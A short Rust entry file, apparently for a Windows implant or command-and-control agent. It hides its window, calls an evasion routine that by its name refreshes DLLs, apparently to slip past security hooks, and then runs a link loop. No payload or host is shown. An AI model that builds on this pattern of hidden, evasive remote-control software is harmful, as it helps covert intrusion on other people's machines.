#![windows_subsystem = "windows"]
// above declaration keeps the window hidden

mod nonstd;
mod stdlib;
mod evasion;

// UM link
fn main() {
    evasion::refresh_dlls();
    stdlib::link_loop();
}